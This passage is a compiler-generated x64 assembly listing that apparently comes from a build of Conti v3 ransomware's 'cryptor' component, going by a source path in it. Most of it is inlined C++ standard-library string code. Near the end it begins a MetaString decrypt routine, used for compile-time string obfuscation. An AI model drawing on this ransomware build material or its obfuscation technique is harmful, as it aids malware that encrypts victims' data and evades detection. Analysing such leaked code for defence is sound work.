  0004c	48 8b ce	 mov	 rcx, rsi
  0004f	e8 00 00 00 00	 call	 memmove

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00054	33 c0		 xor	 eax, eax
  00056	66 89 04 33	 mov	 WORD PTR [rbx+rsi], ax

; 3229 :         return *this;
; 3230 :     }

  0005a	48 8b c7	 mov	 rax, rdi
  0005d	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  00062	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00067	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0006b	5f		 pop	 rdi
  0006c	c3		 ret	 0
$LN10@operator:

; 3422 :         return _Reallocate_for(

  0006d	e8 00 00 00 00	 call	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
$LN20@operator:

; 3229 :         return *this;
; 3230 :     }

  00072	48 8b c7	 mov	 rax, rdi
  00075	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00079	5f		 pop	 rdi
  0007a	c3		 ret	 0
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z
_TEXT	SEGMENT
this$ = 8
_Right$ = 16
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0000c	48 89 41 18	 mov	 QWORD PTR [rcx+24], rax

; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00010	0f 10 02	 movups	 xmm0, XMMWORD PTR [rdx]
  00013	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0
  00016	0f 10 4a 10	 movups	 xmm1, XMMWORD PTR [rdx+16]
  0001a	0f 11 49 10	 movups	 XMMWORD PTR [rcx+16], xmm1

; 3081 : 
; 3082 :                 _Right_data._Mysize = 0;

  0001e	48 89 42 10	 mov	 QWORD PTR [rdx+16], rax

; 3084 :                 _Right_data._Activate_SSO_buffer();
; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  00022	66 89 02	 mov	 WORD PTR [rdx], ax

; 2817 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));
; 2818 :         _Take_contents(_Right);
; 2819 :     }

  00025	48 8b c1	 mov	 rax, rcx

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  00028	48 c7 42 18 07
	00 00 00	 mov	 QWORD PTR [rdx+24], 7

; 2817 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));
; 2818 :         _Take_contents(_Right);
; 2819 :     }

  00030	c3		 ret	 0
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z
_TEXT	SEGMENT
this$ = 80
_Ptr$ = 88
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2556 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN76:
  00000	40 53		 push	 rbx
  00002	55		 push	 rbp
  00003	56		 push	 rsi
  00004	41 56		 push	 r14
  00006	41 57		 push	 r15
  00008	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0000c	45 33 ff	 xor	 r15d, r15d
  0000f	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00012	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00015	4c 89 79 10	 mov	 QWORD PTR [rcx+16], r15

; 2556 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

  00019	48 8b ea	 mov	 rbp, rdx

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0001c	4c 89 79 18	 mov	 QWORD PTR [rcx+24], r15

; 2556 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

  00020	48 8b f1	 mov	 rsi, rcx

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00023	48 c7 c3 ff ff
	ff ff		 mov	 rbx, -1
  0002a	66 0f 1f 44 00
	00		 npad	 6
$LL62@basic_stri:
  00030	48 ff c3	 inc	 rbx
  00033	66 44 39 3c 5a	 cmp	 WORD PTR [rdx+rbx*2], r15w
  00038	75 f6		 jne	 SHORT $LL62@basic_stri

; 2669 :         if (_Count > max_size()) {

  0003a	49 be fe ff ff
	ff ff ff ff 7f	 mov	 r14, 9223372036854775806 ; 7ffffffffffffffeH
  00044	49 3b de	 cmp	 rbx, r14
  00047	0f 87 ed 00 00
	00		 ja	 $LN74@basic_stri
  0004d	48 89 7c 24 60	 mov	 QWORD PTR [rsp+96], rdi

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00052	48 83 fb 07	 cmp	 rbx, 7
  00056	77 21		 ja	 SHORT $LN13@basic_stri

; 2678 :             _My_data._Mysize = _Count;

  00058	48 89 59 10	 mov	 QWORD PTR [rcx+16], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0005c	48 03 db	 add	 rbx, rbx
  0005f	4c 8b c3	 mov	 r8, rbx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00062	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0006a	e8 00 00 00 00	 call	 memcpy

; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  0006f	66 44 89 3c 33	 mov	 WORD PTR [rbx+rsi], r15w

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();
; 2696 :             return;

  00074	e9 a1 00 00 00	 jmp	 $LN11@basic_stri
$LN13@basic_stri:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00079	48 8b c3	 mov	 rax, rbx
  0007c	48 83 c8 07	 or	 rax, 7
  00080	49 3b c6	 cmp	 rax, r14

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00083	76 10		 jbe	 SHORT $LN18@basic_stri

; 4763 :             return _Max;

  00085	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  0008f	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  00093	eb 2e		 jmp	 SHORT $LN59@basic_stri
$LN18@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00095	b9 0a 00 00 00	 mov	 ecx, 10
  0009a	4c 8b f0	 mov	 r14, rax
  0009d	48 3b c1	 cmp	 rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  000a0	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  000aa	4c 0f 42 f1	 cmovb	 r14, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  000ae	49 8d 4e 01	 lea	 rcx, QWORD PTR [r14+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  000b2	48 3b c8	 cmp	 rcx, rax
  000b5	77 7d		 ja	 SHORT $LN60@basic_stri

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  000b7	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  000ba	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  000c1	72 24		 jb	 SHORT $LN34@basic_stri
$LN59@basic_stri:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  000c3	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  000c7	48 3b c1	 cmp	 rax, rcx
  000ca	76 68		 jbe	 SHORT $LN60@basic_stri

; 90   :         return ::operator new(_Bytes);

  000cc	48 8b c8	 mov	 rcx, rax
  000cf	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  000d4	48 85 c0	 test	 rax, rax
  000d7	74 55		 je	 SHORT $LN43@basic_stri

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  000d9	48 8d 78 27	 lea	 rdi, QWORD PTR [rax+39]
  000dd	48 83 e7 e0	 and	 rdi, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  000e1	48 89 47 f8	 mov	 QWORD PTR [rdi-8], rax

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  000e5	eb 12		 jmp	 SHORT $LN33@basic_stri
$LN34@basic_stri:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  000e7	48 85 c9	 test	 rcx, rcx
  000ea	74 0a		 je	 SHORT $LN35@basic_stri

; 90   :         return ::operator new(_Bytes);

  000ec	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000f1	48 8b f8	 mov	 rdi, rax

; 248  :         return _Traits::_Allocate(_Bytes);

  000f4	eb 03		 jmp	 SHORT $LN33@basic_stri
$LN35@basic_stri:

; 249  :     }
; 250  : 
; 251  :     return nullptr;

  000f6	49 8b ff	 mov	 rdi, r15
$LN33@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2703 :         _My_data._Mysize = _Count;

  000f9	48 89 5e 10	 mov	 QWORD PTR [rsi+16], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000fd	48 8b d5	 mov	 rdx, rbp
  00100	48 03 db	 add	 rbx, rbx

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00103	48 89 3e	 mov	 QWORD PTR [rsi], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00106	4c 8b c3	 mov	 r8, rbx

; 2704 :         _My_data._Myres  = _New_capacity;

  00109	4c 89 76 18	 mov	 QWORD PTR [rsi+24], r14

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0010d	48 8b cf	 mov	 rcx, rdi
  00110	e8 00 00 00 00	 call	 memcpy

; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  00115	66 44 89 3c 3b	 mov	 WORD PTR [rbx+rdi], r15w
$LN11@basic_stri:
  0011a	48 8b 7c 24 60	 mov	 rdi, QWORD PTR [rsp+96]

; 2557 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));
; 2558 :     }

  0011f	48 8b c6	 mov	 rax, rsi
  00122	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00126	41 5f		 pop	 r15
  00128	41 5e		 pop	 r14
  0012a	5e		 pop	 rsi
  0012b	5d		 pop	 rbp
  0012c	5b		 pop	 rbx
  0012d	c3		 ret	 0
$LN43@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0012e	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00133	cc		 int	 3
$LN60@basic_stri:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  00134	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00139	cc		 int	 3
$LN74@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2670 :             _Xlen_string(); // result too long

  0013a	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  0013f	cc		 int	 3
$LN72@basic_stri:
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 64
_Right$ = 72
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2508 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

$LN77:
  00000	48 89 5c 24 18	 mov	 QWORD PTR [rsp+24], rbx
  00005	55		 push	 rbp
  00006	56		 push	 rsi
  00007	57		 push	 rdi
  00008	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0000c	33 c0		 xor	 eax, eax
  0000e	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00011	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

  00014	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2508 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

  00018	48 8b d9	 mov	 rbx, rcx

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0001b	48 89 41 18	 mov	 QWORD PTR [rcx+24], rax

; 2235 :         const value_type* _Result = _Bx._Buf;

  0001f	48 8b ea	 mov	 rbp, rdx

; 2244 :         return _Myres > _Small_string_capacity;

  00022	48 83 7a 18 07	 cmp	 QWORD PTR [rdx+24], 7

; 2236 :         if (_Large_mode_engaged()) {

  00027	76 03		 jbe	 SHORT $LN10@basic_stri

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00029	48 8b 2a	 mov	 rbp, QWORD PTR [rdx]
$LN10@basic_stri:

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  0002c	48 8b 7a 10	 mov	 rdi, QWORD PTR [rdx+16]

; 2669 :         if (_Count > max_size()) {

  00030	48 be fe ff ff
	ff ff ff ff 7f	 mov	 rsi, 9223372036854775806 ; 7ffffffffffffffeH
  0003a	48 3b fe	 cmp	 rdi, rsi
  0003d	0f 87 de 00 00
	00		 ja	 $LN75@basic_stri

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00043	48 83 ff 07	 cmp	 rdi, 7
  00047	77 23		 ja	 SHORT $LN16@basic_stri

; 2678 :             _My_data._Mysize = _Count;

  00049	48 89 79 10	 mov	 QWORD PTR [rcx+16], rdi

; 2510 :     }

  0004d	48 8b c3	 mov	 rax, rbx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00050	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00058	0f 10 45 00	 movups	 xmm0, XMMWORD PTR [rbp]
  0005c	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2510 :     }

  0005f	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  00064	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00068	5f		 pop	 rdi
  00069	5e		 pop	 rsi
  0006a	5d		 pop	 rbp
  0006b	c3		 ret	 0
$LN16@basic_stri:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  0006c	48 8b cf	 mov	 rcx, rdi
  0006f	48 83 c9 07	 or	 rcx, 7
  00073	48 3b ce	 cmp	 rcx, rsi

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00076	76 0f		 jbe	 SHORT $LN21@basic_stri

; 4763 :             return _Max;

  00078	48 b9 ff ff ff
	ff ff ff ff 7f	 mov	 rcx, 9223372036854775807 ; 7fffffffffffffffH
  00082	48 03 c9	 add	 rcx, rcx
  00085	eb 2f		 jmp	 SHORT $LN62@basic_stri
$LN21@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  00087	ba 0a 00 00 00	 mov	 edx, 10
  0008c	48 8b f1	 mov	 rsi, rcx
  0008f	48 3b ca	 cmp	 rcx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  00092	48 b9 ff ff ff
	ff ff ff ff 7f	 mov	 rcx, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\utility

; 77   :     return _Left < _Right ? _Right : _Left;

  0009c	48 0f 42 f2	 cmovb	 rsi, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  000a0	48 8d 56 01	 lea	 rdx, QWORD PTR [rsi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  000a4	48 3b d1	 cmp	 rdx, rcx
  000a7	77 72		 ja	 SHORT $LN63@basic_stri

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  000a9	48 8d 0c 12	 lea	 rcx, QWORD PTR [rdx+rdx]

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  000ad	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  000b4	72 27		 jb	 SHORT $LN37@basic_stri
$LN62@basic_stri:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  000b6	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  000ba	48 3b c1	 cmp	 rax, rcx
  000bd	76 5c		 jbe	 SHORT $LN63@basic_stri

; 90   :         return ::operator new(_Bytes);

  000bf	48 8b c8	 mov	 rcx, rax
  000c2	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  000c7	48 8b c8	 mov	 rcx, rax

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  000ca	48 85 c0	 test	 rax, rax
  000cd	74 46		 je	 SHORT $LN46@basic_stri

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  000cf	48 83 c0 27	 add	 rax, 39			; 00000027H
  000d3	48 83 e0 e0	 and	 rax, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  000d7	48 89 48 f8	 mov	 QWORD PTR [rax-8], rcx

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  000db	eb 0a		 jmp	 SHORT $LN38@basic_stri
$LN37@basic_stri:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  000dd	48 85 c9	 test	 rcx, rcx
  000e0	74 05		 je	 SHORT $LN38@basic_stri

; 90   :         return ::operator new(_Bytes);

  000e2	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
$LN38@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000e7	4c 8d 04 7d 02
	00 00 00	 lea	 r8, QWORD PTR [rdi*2+2]

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  000ef	48 89 03	 mov	 QWORD PTR [rbx], rax

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000f2	48 8b d5	 mov	 rdx, rbp

; 2703 :         _My_data._Mysize = _Count;

  000f5	48 89 7b 10	 mov	 QWORD PTR [rbx+16], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  000f9	48 8b c8	 mov	 rcx, rax

; 2704 :         _My_data._Myres  = _New_capacity;

  000fc	48 89 73 18	 mov	 QWORD PTR [rbx+24], rsi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00100	e8 00 00 00 00	 call	 memcpy

; 2510 :     }

  00105	48 8b c3	 mov	 rax, rbx
  00108	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  0010d	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00111	5f		 pop	 rdi
  00112	5e		 pop	 rsi
  00113	5d		 pop	 rbp
  00114	c3		 ret	 0
$LN46@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  00115	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0011a	cc		 int	 3
$LN63@basic_stri:

; 144  :         _Throw_bad_array_new_length(); // add overflow

  0011b	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
  00120	cc		 int	 3
$LN75@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2670 :             _Xlen_string(); // result too long

  00121	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  00126	cc		 int	 3
$LN73@basic_stri:
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 64 00 00 00	 mov	 ecx, 100		; 00000064H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3e	 imul	 r8d, ecx, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
